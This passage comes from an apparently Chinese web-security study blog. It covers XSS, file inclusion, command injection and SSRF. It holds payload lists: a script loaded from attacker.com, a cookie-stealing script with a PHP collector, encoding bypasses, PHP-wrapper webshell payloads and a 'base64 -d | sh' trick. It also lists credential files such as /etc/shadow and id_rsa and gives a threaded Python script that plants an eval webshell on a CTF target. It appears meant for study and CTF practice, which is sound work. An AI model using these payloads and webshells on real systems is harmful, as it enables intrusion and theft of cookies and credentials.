<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;反射型XSS漏洞示例&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;搜索框&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">      &lt;input type=&quot;text&quot; name=&quot;search&quot; placeholder=&quot;搜索&quot;&gt;</span><br><span class="line">      &lt;button type=&quot;submit&quot;&gt;搜索&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h2&gt;搜索结果&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">      您搜索的内容是：</span><br><span class="line">      &lt;?php echo $_GET[&#x27;search&#x27;]; ?&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;您已被攻击&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>DOM-based XSS漏洞：攻击者将恶意脚本注入到Web应用程序的客户端代码中，例如JavaScript，通过修改DOM（文档对象模型）来攻击受害者。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSS Example&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function search() &#123;</span><br><span class="line">        var query = document.getElementById(&quot;search-query&quot;).value;</span><br><span class="line">        document.getElementById(&quot;search-results&quot;).innerHTML = &quot;Search results for: &quot; + query;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Search Page&lt;/h1&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;search-query&quot; /&gt;</span><br><span class="line">    &lt;button onclick=&quot;search()&quot;&gt;Search&lt;/button&gt;</span><br><span class="line">    &lt;div id=&quot;search-results&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS Attack!&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>引起该xss漏洞常见的高危属性有：</p>
<ul>
<li>document.referer</li>
<li>window.name</li>
<li>location</li>
<li>innerHTML</li>
<li>documen.write</li>
</ul>
</li>
</ol>
<h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><p>具体可以通过查看页面源代码来看我们的注入是否正确。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;h5&gt;<span class="number">1</span>&lt;/h5&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="string">&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</span></span><br><span class="line"><span class="string">&#x27;&gt;&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&#x27;</span></span><br><span class="line"><span class="string">&quot;&gt;&lt;span&gt;x&lt;/span&gt;//</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击语句"><a href="#攻击语句" class="headerlink" title="攻击语句"></a>攻击语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://attacker.com/a.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;alert(&#x27;error&#x27;)&quot; /&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(1)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PD9waHAgcGhwaW5mbygpOw==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;click&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- html5 --&gt;</span><br><span class="line">&lt;input onfocus=write(1) antofocus&gt;</span><br><span class="line">&lt;input onblur=write(1) antofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!-- 窃取 cookie --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.write(&#x27;&lt;img src=&quot;http://.../cookie.php?cookie=&#x27;+document.cookie&#x27;&quot; width=0 height=0 border=0 /&gt;&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$fp = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);</span><br><span class="line">fwrite($fp, $cookie);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绕过技巧-2"><a href="#绕过技巧-2" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p>一些HTML的实体字符。</p>
<table>
<thead>
<tr>
<th>显示结果</th>
<th>描述</th>
<th>实体名称</th>
<th>实体编号</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>空格</td>
<td>&amp;nbsp</td>
<td>&amp;#160</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于号</td>
<td>&amp;lt</td>
<td>&amp;#60</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td>&amp;gt</td>
<td>&amp;#62</td>
</tr>
<tr>
<td>&amp;</td>
<td>和号</td>
<td>&amp;amp</td>
<td>&amp;#38</td>
</tr>
<tr>
<td>“</td>
<td>引号</td>
<td>&amp;quot</td>
<td>&amp;#34</td>
</tr>
<tr>
<td>‘</td>
<td>撇号</td>
<td>&amp;apos (IE不支持)</td>
<td>&amp;#39</td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Script</span>&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/<span class="title class_">Script</span>&gt;</span><br><span class="line">&lt;script&lt;script&gt;&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;<span class="regexp">/sc&lt;/</span>script&gt;ript&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;img src=a onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=a onerror=&quot;confirm(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&lt;IMG SRC=&quot;java   script:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:  alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">// 限定 &lt; &gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert(&#x27;xss&#x27;);&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// 编码绕过</span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;click&lt;/a&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line">&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;);&lt;/script&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS工具平台"><a href="#XSS工具平台" class="headerlink" title="XSS工具平台"></a>XSS工具平台</h3><p>利用两个经典的xss工具平台对pikachu靶场的存储型xss做一个测试。</p>
<p>第一个是<strong>xssplatform</strong>。</p>
<blockquote>
<p><a href="https://github.com/78778443/xssplatform">GitHub - 78778443&#x2F;xssplatform: 一个经典的XSS渗透管理平台</a></p>
</blockquote>
<p><strong>注意在搭建环境时需要修改<code>.htaccess</code>文件</strong>，主要是为了开启网站的伪静态，具体的修改方式可参考安装说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## 路由重写范例</span><br><span class="line">### .htaccess方式</span><br><span class="line"></span><br><span class="line">### apache方式</span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase /</span><br><span class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L]</span><br><span class="line">RewriteRule ^do/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?do=do&amp;auth=$1&amp;domain=$3 [L]</span><br><span class="line">RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L]</span><br><span class="line">RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">#### nginx方式</span><br><span class="line">rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last;</span><br><span class="line">rewrite &quot;^/do/auth/(\w+?)(/domain/([\w\.]+?))?$&quot; /index.php?do=do&amp;auth=$1&amp;domain=$3 last;</span><br><span class="line">rewrite &quot;^/register/(.*?)$&quot; /index.php?do=register&amp;key=$1 last;</span><br><span class="line">rewrite &quot;^/register-validate/(.*?)$&quot; /index.php?do=register&amp;act=validate&amp;key=$1 last;</span><br></pre></td></tr></table></figure>

<p>进入主页创建项目，选择默认模块即可开始cookie收集的测试，注意开启<code>keepsession</code>。</p>
<p>作者这里测试下来，对于相同的内容，似乎xssplatform不会重复显示。</p>
<p>第二个是<strong>BlueLotus</strong>。</p>
<blockquote>
<p><a href="https://github.com/trysec/BlueLotus_XSSReceiver">GitHub - trysec&#x2F;BlueLotus_XSSReceiver: XSS平台 CTF工具 Web安全工具</a></p>
</blockquote>
<p>环境搭建完成后访问根目录下的<code>admin.php</code>即可登录平台进行测试。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><ul>
<li><code>include()</code>：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li>
<li><code>require()</code> ：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</li>
<li><code>include_once()</code> 和 <code>require_once()</code> ：若文件中代码已被包含则不会再次包含</li>
</ul>
<h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><ol>
<li><p>包含日志文件，将php代码写到ua头中。</p>
<ul>
<li>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</li>
<li>&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</li>
<li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</li>
<li>&#x2F;logs&#x2F;access_log</li>
<li>&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</li>
<li>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</li>
</ul>
</li>
<li><p>读取敏感文件</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_47716438/article/details/119994377">windows和linux敏感文件记录</a></p>
</blockquote>
<ul>
<li><p>网站配置文件：</p>
<ul>
<li>data&#x2F;common.inc.php：dedecms</li>
<li>config&#x2F;config_global.php：discuz</li>
<li>caches&#x2F;configs&#x2F;database.php：phpcms</li>
<li>conf&#x2F;database.php：phpwind</li>
<li>wp-config.php：wordpress</li>
</ul>
</li>
<li><p>Linux下的敏感文件：</p>
<ul>
<li>&#x2F;etc&#x2F;shadow</li>
<li>&#x2F;etc&#x2F;passwd</li>
<li>&#x2F;etc&#x2F;sudoers：定义了哪些用户可以使用 sudo 命令以及其他命令</li>
<li>&#x2F;etc&#x2F;my.cnf</li>
<li>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </li>
<li>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</li>
<li>&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore</li>
<li>&#x2F;root&#x2F;.ssh&#x2F;known_hosts</li>
<li>&#x2F;root&#x2F;.bash_history</li>
<li>&#x2F;root&#x2F;.mysql_history</li>
</ul>
</li>
<li><p>Windows下的敏感文件：</p>
<ul>
<li>C:\boot.ini：查看系统版本</li>
<li>C:\Windows\System32\inetsrv\MetaBase.xml：IIS配置文件</li>
<li>C:\Windows\repair\sam：存储系统初次安装的密码</li>
<li>C:\Program Files\mysql\my.ini：Mysql配置</li>
<li>C:\Program Files\mysql\data\mysql\user.MYD：Mysql root</li>
<li>C:\Windows\php.ini：php配置信息</li>
<li>C:\Windows\my.ini：Mysql配置信息</li>
<li>C:\Windows\win.ini：基本系统配置文件</li>
</ul>
</li>
</ul>
</li>
<li><p>伪协议</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/1561366-20191025095141008-73449695.png" alt="1561366-20191025095141008-73449695"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php		// 两位一反转</span><br><span class="line"></span><br><span class="line">php://input		// [POST] &lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">compress.zlib://file.gz</span><br><span class="line">compress.bzip2://file.bz2</span><br><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]		// 用于访问压缩包内的指定文件</span><br><span class="line">phar://C:/flag.php</span><br><span class="line"></span><br><span class="line">data://text/plain,&lt;?= system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">data://text/plain;base64,PD89IHN5c3RlbSgnbHMnKTs/Pg==</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.base64-decode/resource=flag.php</span><br><span class="line">php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/write=string.rot13/resource=flag.php</span><br><span class="line"></span><br><span class="line">php://filter/read=string.strip_tags/resource=test.php		// 去除 XML 标签，&lt;?php ?&gt;</span><br></pre></td></tr></table></figure>

<p>利用iconv进行编码的转换，用于过掉一些垃圾字符：</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP: 支持的字符编码 - Manual</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);		</span><br><span class="line"><span class="comment">// ?&lt;hp pvela$(P_SO[T]1;)&gt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php die();?&gt;?&lt;hp pvela$(P_SO[T]1;)&gt;?&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);		<span class="comment">// &lt;?cuc @riny($_CBFG[1]);?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>当 enctype&#x3D;”multipart&#x2F;form-data”，php:&#x2F;&#x2F;input无效</strong></p>
</li>
<li><p>Session</p>
<blockquote>
<p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>
</blockquote>
<p>首先是关于INI选项</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 上传文件时，php会把文件上传的详细信息存储在 session 中</span></span><br><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 读取所有的POST数据就会删除 session 文件中的内容</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">On</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 默认值，用户可以自定义 Session ID</span></span><br><span class="line"><span class="attr">session.use_strict_mode</span> = <span class="literal">off</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br></pre></td></tr></table></figure>

<p>Linux中session文件存储的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/session</span><br><span class="line">/var/lib/php</span><br><span class="line">/var/lib/php/sessions</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br></pre></td></tr></table></figure>

<p>在Windows上做一个测试，这里是把<code>session.upload_progress.cleanup</code>给关掉了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/debug.io/debug.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230930184944702.png" alt="image-20230930184944702"></p>
<p>最后找到了sess_flag文件，里面的内容是：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230930185025996.png" alt="image-20230930185025996"></p>
<p>改了一下师傅们的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://365c4c97-745a-4eb5-b1bd-61ee5af05a26.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;pursue&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span> : <span class="string">&quot;&lt;?php file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url,</span><br><span class="line">                                data = data,</span><br><span class="line">                                cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span> : sessionid&#125;,</span><br><span class="line">                                files = &#123;<span class="string">&#x27;file&#x27;</span> : (<span class="string">&#x27;pursue.jpg&#x27;</span>, fileBytes)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid)</span><br><span class="line">        response2 = session.get(url + <span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> response2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Success!&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
</li>
<li><p>远程包含</p>
<p>包含远程服务器上的一个文件，需要的条件：</p>
<ul>
<li><code>allow_url_include = on</code></li>
<li><code>allow_url_fopen = on</code></li>
</ul>
</li>
</ol>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="高危函数-1"><a href="#高危函数-1" class="headerlink" title="高危函数"></a>高危函数</h3><ul>
<li><p>assert()：可以执行php中的代码以及系统命令，例如<code>assert(phpinfo())</code>，<code>assert(system(ls))</code>。</p>
</li>
<li><p>eval()：可以执行php中的代码以及系统命令，例如<code>eval(phpinfo();)</code>。<strong>注意要有分号</strong>。</p>
</li>
<li><p>exec()：回显最后一行</p>
</li>
<li><p>system()：有回显</p>
</li>
<li><p>shell_exec()：无回显</p>
</li>
<li><p>passthru()：有回显</p>
</li>
<li><p>popen()</p>
</li>
<li><p>proc_open()</p>
</li>
<li><p>preg_replace()：正则代码执行，只有php7.0以下的版本可用。</p>
<p>参考：<a href="https://blog.csdn.net/weixin_49656607/article/details/119833707">(22条消息) 深入研究preg_replace \e模式下的代码执行_preg_replace&#x2F;e_paidx0的博客-CSDN博客</a></p>
</li>
</ul>
<h3 id="利用手法-1"><a href="#利用手法-1" class="headerlink" title="利用手法"></a>利用手法</h3><p>多命令执行</p>
<table>
<thead>
<tr>
<th>命令符</th>
<th>效果</th>
<th>适用操作系统</th>
</tr>
</thead>
<tbody><tr>
<td>;</td>
<td>当有一条命令执行失败时，不会中断其它命令的执行</td>
<td></td>
</tr>
<tr>
<td>|</td>
<td>将一个命令的标准输出管理为另外一个命令的标准输入，当后一个命令失败会执行前一个命令</td>
<td></td>
</tr>
<tr>
<td>&amp;</td>
<td>当有一条命令执行失败时，不会中断其它命令的执行</td>
<td></td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>只有前面的命令执行成功后，它后面的命令才被执行</td>
<td></td>
</tr>
<tr>
<td>||</td>
<td>只有前面的命令执行失败后，它后面的命令才被执行</td>
<td></td>
</tr>
<tr>
<td>%0a</td>
<td>换行执行命令</td>
<td></td>
</tr>
<tr>
<td>&#96;&#96;</td>
<td>只有被双引号包括才会执行</td>
<td>Linux</td>
</tr>
<tr>
<td>$(cmd)</td>
<td>只有被双引号包括才会执行</td>
<td>Linux</td>
</tr>
</tbody></table>
<p>执行命令无回显怎么办？利用 dnslog 进行测试。</p>
<h3 id="绕过技巧-3"><a href="#绕过技巧-3" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><table>
<thead>
<tr>
<th>绕过字符</th>
<th>使用方法</th>
<th>适用操作系统</th>
</tr>
</thead>
<tbody><tr>
<td>%00~%ff</td>
<td>代替空格，echo%99pwn（fuzz得到可用字符）</td>
<td></td>
</tr>
<tr>
<td>%ProgramFiles:~10,1%</td>
<td>代替空格，echo%ProgramFiles:~10,1%1234</td>
<td>Windows</td>
</tr>
<tr>
<td>$IFS$9，${IFS}，;IFS&#x3D;,;</td>
<td>代替空格</td>
<td>Linux</td>
</tr>
<tr>
<td>{cmd,args}</td>
<td>{echo,pwn}</td>
<td>Linux</td>
</tr>
<tr>
<td>&lt;&gt;</td>
<td>cat&lt;&gt;flag</td>
<td>Linux</td>
</tr>
<tr>
<td>变量拼接</td>
<td>a&#x3D;c;b&#x3D;at;c&#x3D;he;d&#x3D;llo;$a$b ${c}$(d)，相当于”cat hello”</td>
<td>Linux</td>
</tr>
<tr>
<td>通配符</td>
<td>cat &#x2F;tm?&#x2F;fl*</td>
<td>Linux</td>
</tr>
<tr>
<td>tac</td>
<td>利用 tac 代替 cat</td>
<td>Linux</td>
</tr>
<tr>
<td>echo</td>
<td>echo “base64-encoded-command” | base64 -d | sh</td>
<td></td>
</tr>
</tbody></table>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF是服务器端请求伪造（Server-Side Request Forgery）的缩写。它是一种安全漏洞，允许攻击者通过欺骗<strong>服务器</strong>来发送恶意的网络请求，进而访问和操作应用程序所在服务器上的敏感数据和功能。攻击者可以利用此漏洞从服务器上发送请求到任意外部系统，包括内部网络中的其他应用、私有IP地址以及公共互联网上的任何系统。这可能会导致各种安全问题，例如信息泄露、未授权访问、拒绝服务攻击等。<strong>数据流为攻击者到服务器到目标地址</strong>。防御措施一般为对目标地址进行过滤。</p>
<h3 id="代码表现-1"><a href="#代码表现-1" class="headerlink" title="代码表现"></a>代码表现</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; <span class="comment">// 从GET参数中获取URL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用cURL库发送HTTP请求</span></span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">  <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">  <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$response</span>; <span class="comment">// 输出响应结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

